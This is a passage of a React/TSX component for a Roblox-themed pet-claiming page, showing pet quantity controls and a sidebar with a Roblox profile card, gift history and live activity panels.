                          </Button>
                          <div className="w-10 h-8 sm:w-12 sm:h-8 bg-green-600 border border-green-700 rounded flex items-center justify-center text-white font-semibold text-sm">
                            {petQuantities[pet.id] || 0}
                          </div>
                          <Button
                            size="sm"
                            variant="outline"
                            className="w-8 h-8 sm:w-8 sm:h-8 p-0 bg-green-600 border-green-700 text-white hover:bg-green-700 transition-all duration-200 hover:scale-110 touch-manipulation"
                            onClick={() => updateQuantity(pet.id, 1)}
                          >
                            <Plus className="h-3 w-3 sm:h-4 sm:w-4" />
                          </Button>
                        </div>
                      </>
                    )}
                  </CardContent>
                </Card>
              ))}
            </div>
          </div>
          {/* Right sidebar */}
          <div className="w-full lg:w-80 space-y-4 order-1 lg:order-2">
            {/* Roblox Profile */}
            {robloxUser && (
              <Card className="bg-white/90 backdrop-blur-sm">
                <CardHeader className="pb-3">
                  <CardTitle className="flex items-center gap-2 text-sm sm:text-base">
                    <User className="h-4 w-4 sm:h-5 sm:w-5 text-blue-600" />
                    Roblox Profile
                    <Badge variant="secondary" className="bg-green-100 text-green-700 text-xs">
                      Live
                    </Badge>
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-4">
                  <div className="flex items-center gap-3">
                    <div className="relative">
                      {avatarLoading ? (
                        <div className="w-12 h-12 sm:w-16 sm:h-16 bg-gray-200 rounded-full flex items-center justify-center animate-pulse">
                          <RefreshCw className="h-6 w-6 sm:h-8 sm:w-8 text-gray-400 animate-spin" />
                        </div>
                      ) : (
                        <img
                          src={robloxUser.avatar || "/placeholder.svg"}
                          alt={robloxUser.name}
                          className="w-12 h-12 sm:w-16 sm:h-16 rounded-full border-2 border-gray-200 shadow-sm"
                          onError={(e) => {
                            console.log("❌ Avatar failed to load in profile, using fallback")
                            e.currentTarget.src = `/placeholder.svg?height=100&width=100&text=${robloxUser.name}`
                          }}
                        />
                      )}
                      {robloxUser.avatarSource === "placeholder" && (
                        <Button
                          size="sm"
                          variant="ghost"
                          onClick={refreshAvatar}
                          className="absolute -bottom-1 -right-1 w-6 h-6 p-0 bg-yellow-500 hover:bg-yellow-600 rounded-full touch-manipulation"
                          title="Refresh avatar"
                        >
                          <RefreshCw className="h-3 w-3 text-white" />
                        </Button>
                      )}
                    </div>
                    <div>
                      <h3 className="font-bold text-sm sm:text-lg">{robloxUser.displayName}</h3>
                      <p className="text-gray-600 text-xs sm:text-sm">@{robloxUser.name}</p>
                      {robloxUser.hasVerifiedBadge && (
                        <Badge className="bg-blue-500 text-white mt-1 text-xs">Verified</Badge>
                      )}
                    </div>
                  </div>
                  <div className="space-y-2 text-xs sm:text-sm">
                    <div className="flex items-center gap-2">
                      <Users className="h-3 w-3 sm:h-4 sm:w-4 text-gray-500" />
                      <span>User ID: {robloxUser.id}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <Calendar className="h-3 w-3 sm:h-4 sm:w-4 text-gray-500" />
                      <span>Joined: {formatDate(robloxUser.created)}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <Trophy className="h-3 w-3 sm:h-4 sm:w-4 text-gray-500" />
                      <span>Pets Claimed: {totalClaimed}</span>
                    </div>
                    <div className="flex items-center gap-2">
                      <ImageIcon className="h-3 w-3 sm:h-4 sm:w-4 text-gray-500" />
                      <span>
                        Avatar:{" "}
                        {robloxUser.avatarSource === "roblox-api"
                          ? "Official"
                          : robloxUser.avatarSource === "fallback"
                            ? "Fallback"
                            : "Placeholder"}
                      </span>
                    </div>
                  </div>
                  {robloxUser.description && (
                    <div>
                      <h4 className="font-semibold mb-1 text-sm">Description:</h4>
                      <p className="text-xs sm:text-sm text-gray-600">{robloxUser.description}</p>
                    </div>
                  )}
                </CardContent>
              </Card>
            )}
            {/* Gift History */}
            <Card className="bg-white/90 backdrop-blur-sm">
              <CardContent className="p-4">
                <div className="flex items-center gap-2 mb-4">
                  <Gift className="h-4 w-4 sm:h-5 sm:w-5 text-green-600" />
                  <h3 className="font-semibold text-gray-800 text-sm sm:text-base">Gift History</h3>
                </div>
                <div className="text-center text-gray-500 py-6 sm:py-8 text-sm">No gifts sent yet</div>
              </CardContent>
            </Card>
            {/* Live Activity */}
            <Card className="bg-white/90 backdrop-blur-sm">
              <CardContent className="p-4">
                <div className="flex items-center gap-2 mb-4">
                  <Activity className="h-4 w-4 sm:h-5 sm:w-5 text-blue-600" />
                  <h3 className="font-semibold text-gray-800 text-sm sm:text-base">Live Activity</h3>
                </div>
                {totalClaimed > 0 ? (
                  <div className="space-y-2">
                    <div className="text-xs sm:text-sm text-gray-600">
                      {robloxUser?.name} claimed {totalClaimed} pets
                    </div>
                  </div>
                ) : (
                  <div className="text-center text-gray-500 py-6 sm:py-8 text-sm">No recent activity</div>
                )}
              </CardContent>
            </Card>
          </div>
        </div>
      </div>
    </div>
  )
}
